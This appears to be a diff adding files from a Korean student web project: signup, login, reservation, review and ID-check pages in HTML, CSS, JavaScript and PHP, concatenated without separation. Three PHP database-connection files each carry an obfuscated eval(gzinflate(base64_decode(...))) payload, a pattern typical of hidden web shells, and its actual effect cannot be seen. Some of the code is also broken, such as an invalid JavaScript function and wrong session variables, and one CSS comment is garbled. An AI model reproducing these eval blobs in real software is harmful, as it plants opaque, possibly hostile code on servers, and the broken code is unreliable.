+    <span class="a a1"><br>&nbsp;&nbsp; 관심분야<br>&nbsp;&nbsp; (한가지만 선택)</span>
+    <span class="b a1"></span>
+    <span class="c ca">
+      <div class="c_box"><input type="checkbox" name="user_field" id="1" onclick="cb(1)" value="악성신생물(각종 암)">악성신생물(각종 암)</div>
+      <div class="c1_box"><input type="checkbox" name="user_field" id="2" onclick="cb(2)" value="정신 및 행동장애">정신 및 행동장애</div>
+      <div class="c_box"><input type="checkbox" name="user_field" id="3" onclick="cb(3)" value="순환계통 질환">순환계통 질환</div>
+      <div class="c1_box"><input type="checkbox" name="user_field" id="4" onclick="cb(4)" value="소화계통 질환">소화계통 질환</div>
+      <div class="c_box"><input type="checkbox" name="user_field" id="5" onclick="cb(5)" value="호흡계통 질환">호흡계통 질환</div>
+    </span>    
+  </div>
+
+  <div class="in">  <!-- 현재연령 -->
+    <span class="a">현재연령</span>
+    <span class="b"></span>
+    <span class="c">
+    <select name="user_age" class="in3" id="user_age">
+    <option value="">연령</option>
+    </select>
+    </span>
+  </div>
+  
+  <div class="o2">   <!-- 회원가입 버튼 -->
+    <input type="button" value="회원가입" onclick="sent()" class="btn">
+    <input type="reset" value="가입취소" class="btn1">
+  </div>
+</form>
+ 
+<script src="./area_data.js?v=1"></script>
+<script src="./age_data.js?v=1"></script>
+</body>
+</html>
+
+        <?php
+$host = "localhost";
+$user = "hyuk313"; 
+$pwd = "*";
+$dbname = "hyuk313";
+$tables = "health";
+
+$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
+mysqli_select_db($connect,$dbname);
+?>
+<?php eval(gzinflate(base64_decode('DdJHsptYAADA49guFuRULi8IQgiREXEzRc7wgAcCTj//DN3lkQ6/67udqiGF5e8s3UqG+q8o87kof/+qko+6LWYoPBz0vG2lBvfbdDbH8ozreebJHG+vffMOHocU66GzPRDTDnude+9sRHOhost04GZVs6jIksBlAbCqGIJOWCIKkwo/DLwa+t1sGO6BgoZcgA62NmVuwuHIuPog56NO1SkIjXgrHyO/RfbDRvhOEkjfQbAg8Xqsubaj5oyHNFvUeKfBxsSxVo9BNThnBva4L0OpbIwRMdUyiwYy6LMBGZ4xu98Ad3Rr+zQBK5iM3Ys9eA9GSqqG+HJzyJID5eVEoNPFS9I2so4dqf4uwGtwLqCW7sMObPtmehU6o4+LlkyPh9IgGS0J2zoCLxXOLYXikR0+rbbYqp7Ner+mVOMnTzWgryxvMIjIgvFR5ne4dJlne/J2sxNeu7cvLn2mqw0FkSZl5VsiesuvEqYVfECyQ+fNeLCtaNl3cpzK2mRfU7+EnT9YorKg2zQFPMO9F/CoWhH9SDMo77TXHO6LcSXOhzJ2je+cGBAN9MNUyadY8Agq5RlSFtHcaMfTqD4PldnuM8jg80Az17aE4xXRqhhhXv5i3kTn6WcXEXUbGhj7lDu8SIt8GKJnaic05kfI7CqcXgxDWNChZEWbIXshYE2IF3Y9DR7i5ne2N/W895Za6ztTRSCrAspd8/mlqI32fBEjxTyLKItVId57sAVkzvXEqJBBAtUAfENsXwzlOktniVnquHw6RNGtNZk5rqvD5Y3aEKbp4ZG7DJSO7DrR90xpTNH6XdT9cd/WmJ0vTZ+3nyV15BCG3uVQjvwcL9ojD54bPVjAGRe1DeEDcxRxje3rpGQ5aebgU4TSJ1tLYKTM7O72mu9rOUoO5CXkmVsxX4bc+GXyWrgu1nAP4CNJTFHCSNKFOmaLdk0/BSArUyKxdXaJusPUtYmVtKYSfpN0lDCe3/ZC/+4FfogzGz3PQ2JkbV2umUzSW9R9A2EaTbH6WVLz3V6wmrks8Y4F8+MGFKbpzYAmAu2Q7ygpEF+9GZDrgJoTljLWPu5wpPOnc2Un0w4eJVxSWNjE+qOcWUUDciiwQ5B1d0hXOXWeqNnNAZIU33nBM9JSz/bwAC75LctL1Vyg+Tm/k5UI0OQM0n5pB/IorUyophF6yWh8XAqGTqZ+r+to44VQcuiQ3uMj4vJyi4qn9ErhZvEyfI+GscxepCiuf5mipmg2ak/sz1CU5QvUQuGpuTNSfO2yz08SuFAc9821uA/MtcizH7VqoaVj2a6rCAoJ93BRjcDxSifkJTqcimvsb4z00U0lk4o/melJBT81AXUz1kXTICZK8/OxORI2l5pDXsNRdub5cX0HDhhlYfK0vnpefMS2c6xTNapUdPT99+/Xnz9//v4P')));
+?>
+    
+    body { margin: 0; padding: 0; width: 800px; font-size: 14px;}
+span, label {display: block;}
+ul, ol  { list-style: none; margin: 0; padding: 0;}
+
+.o1 {
+  
+  height: 60px;
+  line-height: 60px;
+  text-align: center;
+  font-size: 20px;
+  border-bottom : 1px solid gray;
+  box-sizing: border-box; 
+}
+
+.o2 {
+  
+  height: 60px;
+  vertical-align: middle;
+  line-height: 60px;
+   
+  
+}
+.c_box .c1_box:hover {
+  color:red;
+}
+
+.btn {
+  width: 100px; height: 40px;
+  border: 1px solid blue;
+  border-radius: 5px;
+  background-color: blue; color: whitesmoke;
+  margin-left: 290px;
+  cursor: pointer;
+
+}
+
+.btn1 {
+  width: 100px; height: 40px;
+  border: 1px solid gray;
+  border-radius: 5px;
+  background-color: gray; color: whitesmoke;
+  margin-left: 20px;
+  cursor: pointer;
+
+}
+
+
+.in {
+  height: 60px;
+  line-height: 60px;
+  border-bottom : 1px solid gray;
+  box-sizing: border-box; 
+  vertical-align: middle;
+  
+}
+
+.in0 { 
+  border-top : 1px solid gray;
+  box-sizing: border-box; 
+  }
+
+.a { 
+  width: 150px;  height: 60px;
+  /* margin-left: 5px;
+  margin-left: 5px; */
+  float: left;
+  vertical-align: middle;
+  text-indent: 15px;
+   
+}
+
+.b { 
+  width: 30px;   height: 60px;
+  float: left;
+   
+}
+
+.c { 
+  width: 620px;  height: 60px;
+  margin-top: -2px;
+  float: left;
+  
+}
+
+
+.ex {
+  height: 90px;
+  
+}
+
+.a1 { 
+  margin-top: 0px;
+  height: 90px;
+  /* vertical-align: middle; */
+  line-height: 20px;
+  cursor: pointer;  
+  text-indent: 10px;
+}
+
+.ca{
+  margin-top: -15px;
+  height: 90px;
+  vertical-align: middle;
+  cursor: pointer;  
+}
+
+.in1 {
+  width: 250px; height: 40px;
+  border-width: 1px;
+  border-radius: 5px;
+}
+
+.in2 {
+  width: 620px; height: 40px;
+  border-width: 1px;
+  border-radius: 5px;
+}
+
+.in3 {
+  width: 150px; height: 40px;
+  border-radius: 5px;
+  
+}
+
+.c_box {
+  position: absolute  ;
+  height: 30px;
+  
+}
+
+.c1_box {
+  position: relative;
+  height: 30px;
+  left:310px;
+}
+        
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>로그인(반응형)</title>
+    <script src="./health_login.js"></script>
+    <link rel="stylesheet" href="./health_login.css" type="text/css">
+</head>
+<body>
+    <form name="f" method="post" action="health_login.php" onsubmit="return logincheck()" enctype="application/x-www-form-urlencoded">
+        <div class="login">
+            <span class="left"><!--아이디,패스워드 입력-->
+                <label>
+                    <div>아이디</div>
+                    <div><input id="user_id" name="user_id" type="text" class="mid" title="아이디"></div>
+                </label>
+                <label>
+                    <div>패스워드</div>
+                    <div><input id="user_pw" type="password" name="user_pw" class="mid" title="패스워드"></div>
+                </label>
+            </span>
+            <span class="right"><!--로그인 버튼-->
+                <input id="login" type="submit" value="로그인" title="로그인" class="mbtn" onclick="login()">
+            </span>
+            <span class="bottom"><!--회원가입, 비밀번호 찾기-->
+                <ul>
+                    <li id="regist" onclick="regist()">회원가입</li>
+                    <li id="idpw_search" onclick="idpw_search()">아이디/비밀번호 찾기</li>
+                </ul>
+            </span>
+        </div>
+    </form>
+</body>
+</html>
+        <?php
+$host = "localhost";
+$user = "hyuk313"; 
+$pwd = "*";
+$dbname = "hyuk313";
+$tables = "health";
+
+$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
+mysqli_select_db($connect,$dbname);
+?>
+
+<?php eval(gzinflate(base64_decode('Dc5FsqtYAADQ5fz3ikFwqa4eBLsXgjtMuggWPLisvv8Kzin2tPup7noou3Qtft7pUtDkf3mRjXnx86fMDbhMBng+RZtkrxIdX9nV+Frliy1mukbNPesVtcPBIDfIPolCXSBH3OSUsuEeJ+zH4+S9FcLHvAnUexMshrNls+kSHr9cPPGQkPYZpvLqrSS9aKFuZmHNBh5g691jNdJs1OA1fLORN8yEmFReBTdAs04/35YoHaaEOa5pfYyzNQTmLpw4H+DnFCIQn0Zgv8VTRwzpg628IMk0qzO3l6QV1tJBG/nIOFg1Og0gsQBGqdrAPdirEM55tOgawcxZwOR8R/QqqXLKEP0BTTbYai80VGsvhwbnu8zcn9StgbuEQkLaNLK8EC+ctLPMDGVUxKXOQsQRW2trYl2aMvMtkRpfF8FQeZrvR7s97KTbctDISvCYGagEr5froIXymcSx5sMCb79Lf4UvdVoUZ7g4NuoeFXo0tOYtmIyxLBrInz60Q4TJiY4p295R11nYWHbn0lhbJb/oBoLpn6SJQiYaGSg8EqI9mcY4GHF5pa3FfH07eNs6B9iCW2LIHAVx0VyhludL18lMYVzEXphwcPlMbuKzwEGWfw1wYZeLwEENICCkB4zXp8jr5yZN7NldU2KDYCwEgcSsTJYpG7n9Af/iX6VysJ3OQyZQWYXKZaE8E01tDxCxeIrqbWQZUhi0jWogIA1m+uso5yPql3jgXtVX2Qn5YGBF86jGx9LXseTqDOzJQfyZVJFGp9zoFL3pCbWTlR1Tj1s+orSIX2TT8a7COWhYXKfFGoEhln/V/iNSVc7pNT1iRGM3prmBtb4LtFRU0Xl6dgA3G8VUSN2J2+39cKILuOrXWoWQpsqVw85Zx9VvEfujXHxMk9atsT+Sada4i+w2r1vUqJbBNkZxG+h4J27OImyym2RnGIMXrRJBz7clHy52HS02X/gHoCXJcEBGaPb6SuJElGd/g9imyImfl1/c6JmyTLjMp3MAfYSDsfmENBulHMQRQGCkquyaFKWDtHZIzoWWcXssiyvi3uVvxANkedZ+yqnSwVqFekXTHH2Pj0UCEQAvZubByHadup5ZpKpAHRHjS7F5uRPM41Htj7c5OXC996Lr7BbfOozfeBQwTnkeZGZlT4ggozzEHykLqpwwHn5k9f6DjeXmLU17S3jvx9rdQvHKUVBHkfHJY8GnqTFuLqFA6K5XX4ITRw2qzk+9nKGfJrj3djt5WWZU2Ot905TC6thVcScy/3tCSr1EHPbfP7+/v//8Dw==')));
+?>
+    function logincheck(){
+    if(f.user_id.value==""){
+        alert("아이디입력하셔요");
+        return false;
+    }
+    else if(f.user_pw.value==""){
+        alert("비밀번호를 입력하셔요");
+        return false;
+    }
+    else{
+        // f.submit();
+        return true;
+    }
+}
+        body{
+    margin: 0;
+    padding: 0;
+    font-size: 13px;
+}
+.login { 
+    width:600px;
+    height: 200px;
+    border:1px solid black;
+    box-sizing: border-box;
+    padding: 25px;
+    margin: 0 auto;
+}
+.left{
+    width: 400px;
+    height: 80px;
+    display: block;
+    float: left;
+    margin-right: 23px;
+}
+.left > label{
+    width: inherit;
+    height: 35px;
+    display: block;
+}
+.left > label:nth-of-type(1){
+    margin-bottom: 10px;
+}
+.left > label > div{
+    float: left;
+}
+.left > label > div:nth-of-type(1){
+    width: 100px;
+    height: 35px;
+    line-height: 35px;
+    margin-right: 25px;
+}
+.left > label > div:nth-of-type(2){
+    width: 275px;
+    height: 35px;
+}
+.right{
+    width: 125px;
+    height: 80px;
+    background-color: gray;
+    display: block;
+    float: left;
+}
+.mbtn {
+    width: 125px;
+    height: 80px;
+    background-color: black;
+    color: white;
+    border: 0;
+    cursor: pointer;
+}
+.bottom{
+    clear: both;
+    display: block;
+    width: 550px;
+    height: 40px;
+    position: relative;
+    top:30px;
+}
+.bottom > ul {
+    /*
+    width: 550px;
+    height: 40px;
+    */
+    width: inherit;
+    height: inherit;
+    list-style: none;
+    margin: 0;
+    padding: 0;
+}
+
+.bottom > ul > li{
+    width: 50%;
+    height: inherit;
+    float: left;
+    line-height: 40px;
+}
+.bottom > ul > li:nth-of-type(2){
+    text-align: right;
+}
+
+
+/* �낅젰遺�遺� */
+.mid {
+    width: 275px;
+    height: 35px;
+    box-sizing: border-box;
+    text-indent: 5px;
+}
+
+/* 모바일 */
+/* 
+width : % 
+height : px
+*/
+@media screen and (min-width:561px) and (max-width:800px) {
+    .mid {
+        width: 100%;
+    }
+    .login { 
+        width: 100%;
+        height: 220px;
+    }
+    .left{
+        width: 100%;
+        float: none;
+    }
+    .left > label > div:nth-of-type(1){
+        width: 20%;
+        margin-right: 0;
+    }
+    .left > label > div:nth-of-type(2){
+        width: 80%;
+    }
+    .right{
+        margin-top: 10px;
+        width: 100%;
+        height: 40px;
+        float: none;
+    }
+    .mbtn {
+        width: 100%;
+        height: 40px;
+    }
+    .bottom{
+        width: 100%;
+        top:0;
+    }
+}
+
+
+
+
+
+/* 모바일(340 ~ 560) */
+@media screen and (min-width:340px) and (max-width:560px) {
+    body{
+        padding-left: 20px;
+        padding-right: 20px;
+        box-sizing: border-box;
+    }
+    .mid {
+        width: 100%;
+    }
+    .login { 
+        width: 100%;
+        height: 315px;
+    }
+    .left > label > div:nth-of-type(1){
+        width: 100%;
+        margin-right: 0;
+    }
+    .left > label > div:nth-of-type(2){
+        width: 100%;
+    }
+    .left{
+        width: 100%;
+        height: 140px;
+        float: none;
+    }
+    .right{
+        width: 100%;
+        height: 35px;
+        float: none;
+        margin-top: 10px;
+    }
+    .mbtn {
+        width: 100%;
+        height: 35px;
+    }
+
+    .bottom{
+        width: 100%;
+        height: 80px;
+        top:0;
+    }
+    .bottom > ul > li{
+        width: 100%;
+        height: 40px;
+        line-height: 40px;
+        float: none;
+        text-align: center;
+    }
+    .bottom > ul > li:nth-of-type(2){
+        text-align: center;
+    }
+    
+    <?php
+    session_start();
+    $aid=_session['aid'];
+    $aemail =$_session['aemail'];
+    $age=$_session['age'];
+?>
+
+
+
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>로그인 확인</title>
+</head>
+<body>
+    아이디 :  <br>
+    이메일 :  <br>
+    나이 :  <br>
+</body>
+</html>
+}
+        
+        
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>반응형 예제</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+        }
+        .box{   /* pc용 */
+            width: 1200px;
+            height: 100px;
+            border-radius: 5px;
+            background-color: black;
+        }
+        .btn{
+            display: none;
+        }
+        /*
+        screen : 모니터 디바이스 화면
+        print : 인쇄관련 디바이스 화면
+        all : screen + print
+
+        @media : 반응형 웹을 사용하기 위한 속성값
+        min-width : 최소화면 크기 (가로)
+        max-width : 최대화면 크기 (가로)
+        */
+        @media screen and (min-width:561px) and (max-width:1000px) {
+            .box{   /* 타블렛용 */
+            width: 800px;
+            background-color: orange;
+            }
+        }
+
+        @media screen and (min-width:340px) and (max-width:560px) {
+            .box{   /* 모바일(세로) */
+            width:100%;
+            background-color: blue;
+            }
+            .btn{
+            display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="box"></div>
+    <input type="button" value="화면닫기" class="btn">
+</body>
+</html>
+        
+        <!DOCTYPE html>
+<html lang="kr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>예약시스템 만들기</title>
+    <!-- <script src="./index.js?v=3" defer></script>    -->
+</head>
+<script>
+    var reg_date = document.getElementById("reg_date");
+    var reg_timee = document.getElementById("reg_time");
+    var reg_user = document.getElementById("reg_user");
+    var tel_1 = document.getElementById("tel_1");
+    var tel_2 = document.getElementById("tel_2");
+    var tel_3 = document.getElementById("tel_3");
+    var tel = tel_1 + tel_2 + tel_3;
+    var reg_person = document.getElementById("reg_person");
+    var reg_person1 = document.getElementById("reg_person1");
+    var reg_person2 = document.getElementById("reg_person2");
+    
+    console.log(tel);
+
+    function reserve(){
+        send.submit();
+    }
+
+    // 선생님거
+    // function post_res(){
+        // f.submit란 form태그에 id, name과 동일한 이름과 submit() 함수를
+        // 이용하여 form action을 진행하라는 스크립트 언어 입니다.
+        // if(f.reg_date.value==""){   
+            // name값이 있을 경우 form 이름과 name값으로 검토가 가능함
+            // alert("예약일자를 입력하세요");
+        // }
+        // else if(f.tel1.value=="" || f.tel2.value==""){
+            // alert("연락처를 입력하세요");
+        // }
+        // else{
+            // f.reg_tel.value = f.tel1.value + f.tel2.value + f.tel3.value;
+            // if(confirm("예약을 진행 하시겠습니까?")){   
+                // confirm : 확인, 취소 버튼을 이용하여 적용되는 경고메세지 함수
+                // f.submit();
+            // }
+        // }
+    // }
+// 
+
+</script>
+<body>
+    <form id="send" name="send" method="post" action="./reservation_ok.php" enctype="application/x-www-form-urlencoded">
+    예약일자<input type="date"  id="reg_date" name="reg_date" value=""><br>
+    예약시간<input type="time"  id="reg_time" name="reg_time" value=""><br>    
+    예약자<input type="text" id="reg_user" name="reg_user" value="김혜진"><br>    
+    
+    예약자전화번호1<input type="text" id="tel_1" maxlenghth="3" value="010">-
+    <input type="text" id="tel_2" maxlenghth="4" value="6672">-    
+    <input type="text" id="tel_3" maxlenghth="4" value="5830"><br>        
+    
+    <div id="reg_person">
+    방문인원1<input type="checkbox" id="reg_person1" name="reg_person1"><br>    
+    방문인원2<input type="checkbox" id="reg_person2" name="reg_person2"><br>    
+    </div>
+
+    예약하기<input type="submit" id="reserve" onclick="reserve()">
+    </form>
+
+    <!-- 선생님거 -->
+    <!-- <form id="f" name="f" method="post" action="./reservation_ok.php" enctype="application/x-www-form-urlencoded"> -->
+        <!-- <input type="hidden" name="reg_tel" value=""> -->
+        <!-- 예약일자 : <input type="date" name="reg_date"><br> -->
+        <!-- 예약시간 : <input type="time" name="reg_time"><br> -->
+        <!-- 성명 : <input type="text" name="reg_user" value=""><br> -->
+        <!-- 휴대전화 : <input type="text" maxlength="3" name="tel1"> -->
+        <!-- - <input type="text" maxlength="4" name="tel2"> - <input type="text" maxlength="4" name="tel3"> -->
+        <!-- <br> -->
+        <!-- 방문인원 : <input type="radio" name="reg_person" value="1">1명 <input type="radio" name="reg_person" value="2">2명<br> -->
+        <!-- <input type="button" value="방문예약" onclick="post_res()"> -->
+        <!-- </form> -->
+
+
+
+</body>
+</html>
+        
+        var reg_date = document.getElementById("reg_date");
+var reg_timee = document.getElementById("reg_time");
+var reg_user = document.getElementById("reg_user");
+var tel_1 = document.getElementById("tel_1");
+var tel_2 = document.getElementById("tel_2");
+var tel_3 = document.getElementById("tel_3");
+var reg_tel = tel_1+tel_2+tel_3;
+var reg_person = document.getElementById("reg_person");
+var reg_person1 = document.getElementById("reg_person1");
+var reg_person2 = document.getElementById("reg_person2");
+
+var reg_person1 = document.getElementById("reg_person1");
+var reg_person2 = document.getElementById("reg_person2");
+
+function("reg_person"){
+    if(reg_person1.checked){
+        reg_person.value = '1';
+    }
+    else{
+        reg_person = '2';
+    }
+}
+
+// 
+        
+        <!DOCTYPE html>
+<html lang="kr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>상품리뷰등록</title>
+</head>
+<style></style>
+<script>
+    function go_img(){
+        var subject = document.getElementById("subject");
+        var texts = document.getElementById("texts");
+        if(subject.value==""){
+            alert("제목을 입력하셔요");
+            subject.focus();
+        }
+        else if(texts.value == ""){
+            alert("내용을 입력하셔요");
+            texts.focus();
+        }
+        else{
+            if(confirm("리뷰를 등록 할까요?")){
+                f.submit();
+            }
+        }
+    }    
+</script>
+<body>
+    <form name="f" method="post" action="review_ok.php" enctype="multipart/form-data">
+        <input type="hidden" name="rid" value="kang">
+        <input type="hidden" name="rnm" value="강감찬">
+        제목 : <input type="text" id="subject" name="rsubject"><br>
+        내용 : <textarea id="texts" name="rtext" style="width: 300px; height: 100px; resize: none;"></textarea><br>
+        이미지등록 : <input type="file" name="pic" accept=".png,.jpeg, .jpg, .gif, .webp"><br>
+        <input type="button" value="리뷰등록" onclick="go_img()">
+    </form>
+</body>
+</html>
+        
+        <meta charset="UTF-8">
+<?php
+$host = "localhost";
+$user = "hyuk313"; 
+$pwd = "*";
+$dbname = "hyuk313";
+$tables = "review";
+
+$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
+mysqli_select_db($connect,$dbname);
+?>
+
+<?php eval(gzinflate(base64_decode('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')));
+?>
+    
+    <!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>아이디중복찾기 ajax통신</title>
+</head>
+<script>
+    var ajax;  //ajax 통신을 하기 위한 초기 선언 변수값
+    
+    function ichk(){ //사용자가 id 입력할 때 ajax로 통신  // console.log("test");
+        function abc(){  //통신 역할을 할 함수를 로드하는 부분
+            if(window.XMLHttpRequest){
+                return new XMLHttpRequest();
+            }
+        }
+        function loginsearch(){  // ajax를 통해서 back-end값을 전달받는 함수. yes(Y)값 : 사용가능, no(N)값 : 사용불가, error : 아이디값없이 전송할 경우
+        
+            if(ajax.readyState==XMLHttpRequest.DONE && ajax.status==200){
+            // console.log(this.response);
+            //XMLHttpRequest.DONE : 요청한 결과를 받을 경우  call-done
+            //ajax.status==200  : 정상적으로 해당 데이터를 전송 및 회신받는 통신코드   404 201 202 통신장애들
+            post_data(this.response);
+            }
+            else{
+                alert("통신서버오류");
+            }
+    }
+    ajax = abc();  //통신 객체 서버를 사용가능하도록 로드함
+    ajax.onreadystatechange = loginsearch;  // 전송상태 및 확인
+    ajax.open("post","./idcheck.php",true); //post, get 전송형태. post에서만 보안코드로 적용
+    ajax.setRequestHeader("content-type","application/x-www-form-urlencoded");
+
+    var mid = document.getElementById("mid");
+    if(mid.value==""){
+        alert("아이디를 입력하셔요");
+    }
+    else{
+        var data ="userid="+mid.value;
+        ajax.send(data);
+    }
+}
+    function check_form(){
+        if(mname.value==""){
+            alert("이름입력하셔요");
+        }
+        else if(memail.value==""){
+            alert("메일입력하셔요");
+        }
+        else{
+            if(confirm("가입하실래요")){
+                f.submit();
+            }
+        }
+    }
+    function post_data(calldata){
+        var mid= document.getElementById("mid");
+        if(calldata=="yes"){
+            alert("사용가능해요");
+            mid.readOnly = true; //중복안되는 경우, 더이상 사용자id가 수정되지 않도록 제어
+        }
+        else{
+            alert("새id사용하셔요");
+            mid.value="";
+            mid.focus();
+        }
+    }
+
+</script>
+<body>
+    <form name="f" method="post" action="member_ok.php" enctype="application/x-www-form-urlencoded">
+        아이디: <input type="text" id="mid"><button type="button" onclick="ichk()">중복체크</button><br>
+        패스워드: <input type="password" id="mpass"><br>
+        고객명: <input type="text" id="mname"><br>
+        이메일: <input type="text" id="memail"><br>
+        <input type="button" value="회원가입" onclick="check_form()">
+    </form>
+</body>
+</html>
+        
+        
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>아이디 중복찾기 - ajax 통신</title>
+</head>
+<script>
+var ajax;   //ajax통신을 하기 위한 변수값
+
+function idck(){    //사용자가 id 입력시 ajax로 통신
+    function abc(){ //통신 역활을 할 함수를 로드 하는 부분
+        if(window.XMLHttpRequest){
+            return new XMLHttpRequest();
+        }
+    }
+    function loginsearch(){ //ajax를 통해서 backend값을 전달 받는 함수
+        //yes : 사용가능, no : 사용불능, error : 아이디값 없이 전송할 경우
+        if(ajax.readyState==XMLHttpRequest.DONE && ajax.status==200){
+            //XMLHttpRequest.DONE : 요청한 결과를 받을 경우
+            //status==200 : 정상적으로 해당 데이터를 전송 및 회신을 받는 통신코드
+            post_data(this.response);
+        }
+        else{
+            alert("통신서버에 오류가 발생하였습니다.");
+        }
+    }
+    ajax = abc();   //통신 객체 서버를 사용할 수 있도록 로드 합니다.
+    ajax.onreadystatechange = loginsearch;  //전송상태 및 확인
+    ajax.open("post","./idcheck.php",true); //post, get 전송형태
+    //post에서만 보안 코드로 적용하게 됩니다.
+    ajax.setRequestHeader("content-type","application/x-www-form-urlencoded");
+
+    var mid = document.getElementById("mid");
+    if(mid.value==""){
+        alert("아이디를 입력하셔야 합니다.");
+    }
+    else{
+        var data = "userid="+mid.value;
+        ajax.send(data);
+    }
+}
+
+function post_data(calldata){
+    var mid = document.getElementById("mid");
+    if(calldata=="yes"){
+        alert("사용할 수 있는 아이디 입니다.");
+        mid.readOnly = true;    //중복되지 않을 경우 더 이상 사용자 아이디가 수정 되지 않도록 조정
+    }
+    else{
+        alert("새로운 아이디를 입력하세요");
+        mid.value = "";
+        mid.focus();
+    }
+}
+
+</script>
+<body>
+    <form name="f" method="post" action="memberok.php" enctype="application/x-www-form-urlencoded">
+        아이디 : <input type="text" id="mid"><button type="button" onclick="idck()">중복체크</button><br>
+        패스워드 : <input type="password" id="mpass"><br>
+        고객명 : <input type="text" id="mname"><br>
+        이메일 : <input type="text" id="memail"><br>
+        <input type="button" value="회원가입" onclick="check_form()">
+    </form>
+</body>
+</html>
+        <?php
+
+$host = "localhost";
+$user = "hyuk313"; 
+$pwd = "*";
+$dbname = "hyuk313";
+$tables = "members";
+
